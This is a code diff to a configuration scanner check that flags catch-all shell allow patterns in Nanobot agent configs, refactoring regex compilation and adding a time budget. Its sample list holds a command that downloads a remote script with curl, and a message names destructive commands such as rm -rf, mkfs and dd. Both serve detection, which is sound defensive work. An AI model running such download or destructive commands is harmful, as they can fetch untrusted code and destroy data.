@@ -1,6 +1,7 @@
 import type { Evidence } from '../../core/types.js';
 import { defineCheck } from '../../core/check-builder.js';
-import { testSamples } from '../../analyzers/bounded-regex.js';
+import { regexBudget, type RegexBudget } from '../../analyzers/bounded-regex.js';
+import { compileForeignRegex, judgeCatchAll, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
 import { asRecord, asStringArray, getPath, nanobotConfigs, pick, pyBool } from './shared.js';
 
 // allowPatterns are re.fullmatch()ed against each shell segment and take
@@ -18,34 +19,22 @@ const DANGEROUS_SAMPLES = [
   'curl http://x.example/a.sh -o /tmp/a.sh',
 ];
 
-/** Compile a Python `re` pattern for fullmatch semantics; leading inline
- *  flag groups ((?i), (?s), (?is)…) become RegExp flags. The pattern comes
- *  from config: run it with `testSamples`, never `re.test`. */
+/** Compile a Python `re` pattern for fullmatch semantics, Python-only syntax
+ *  translated (foreign-regex.ts); undefined when it can't be run here. The
+ *  pattern comes from config: run it with `testSamples`, never `re.test`. */
 export function compilePyFullmatch(pattern: string): RegExp | undefined {
-  let src = pattern;
-  let flags = '';
-  for (let m = /^\(\?([aiLmsux]+)\)/.exec(src); m; m = /^\(\?([aiLmsux]+)\)/.exec(src)) {
-    for (const f of m[1]) if ('ims'.includes(f) && !flags.includes(f)) flags += f;
-    src = src.slice(m[0].length);
-  }
-  try {
-    return new RegExp(`^(?:${src})$`, flags);
-  } catch {
-    return undefined;
-  }
+  const c = compileForeignRegex(pattern, 'python', { fullmatch: true });
+  return c.kind === 'ok' ? c.re : undefined;
 }
 
 /**
  * `catch-all` for an allow pattern that fullmatches every sample dangerous
- * command, `not-evaluated` for one that couldn't be run on the samples in
- * time (it backtracks exponentially), undefined otherwise.
+ * command, why it is not evaluated (timeout, the check's regex budget spent,
+ * syntax VASO can't run), undefined otherwise — a pattern Python rejects
+ * included (Nanobot raises on it and allows nothing).
  */
-export function judgeAllowPattern(pattern: string): 'catch-all' | 'not-evaluated' | undefined {
-  const re = compilePyFullmatch(pattern.trim());
-  if (!re) return undefined;
-  const hits = testSamples(re, DANGEROUS_SAMPLES, { untilMiss: true });
-  if (!hits) return 'not-evaluated';
-  return hits.every(Boolean) ? 'catch-all' : undefined;
+export function judgeAllowPattern(pattern: string, budget?: RegexBudget): 'catch-all' | NotEvaluated | undefined {
+  return judgeCatchAll(pattern.trim(), 'python', DANGEROUS_SAMPLES, { fullmatch: true, budget });
 }
 
 /** An allow pattern that fullmatches every sample dangerous command. */
@@ -73,18 +62,24 @@ export const nb004 = defineCheck({
   async run(ctx, h) {
     const evidence: Evidence[] = [];
     let critical = false;
+    const budget = regexBudget();
 
     for (const config of nanobotConfigs(ctx.configs)) {
       const exec = asRecord(getPath(config.data, 'tools.exec'));
       if (pyBool(exec?.enable) === false) continue;
 
+      const unjudged: string[] = [];
       for (const pattern of asStringArray(pick(exec, 'allowPatterns'))) {
-        const verdict = judgeAllowPattern(pattern);
-        if (verdict === 'not-evaluated') {
+        const verdict = judgeAllowPattern(pattern, budget);
+        if (verdict === 'budget') {
+          unjudged.push(pattern);
+          continue;
+        }
+        if (verdict === 'timeout' || verdict === 'unsupported') {
           evidence.push({
             file: config.filePath,
             snippet: `tools.exec.allowPatterns: ${JSON.stringify(pattern)}`,
-            detail: 'Allow pattern not evaluated: it backtracks exponentially on sample commands, so whether it exempts dangerous commands from the deny list is unknown — review it',
+            detail: notEvaluatedDetail(verdict, 'exempts dangerous commands from the deny list'),
           });
           continue;
         }
@@ -95,6 +90,9 @@ export const nb004 = defineCheck({
           snippet: `tools.exec.allowPatterns: ${JSON.stringify(pattern)}`,
           detail: 'Catch-all allow pattern matches every command, so neither denyPatterns nor the built-in deny list (rm -rf, mkfs, dd, shutdown, …) is ever applied',
         });
+      }
+      if (unjudged.length > 0) {
+        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.allowPatterns', unjudged, 'exempt dangerous commands from the deny list'));
       }
 
       const sandbox = pick(exec, 'sandbox');
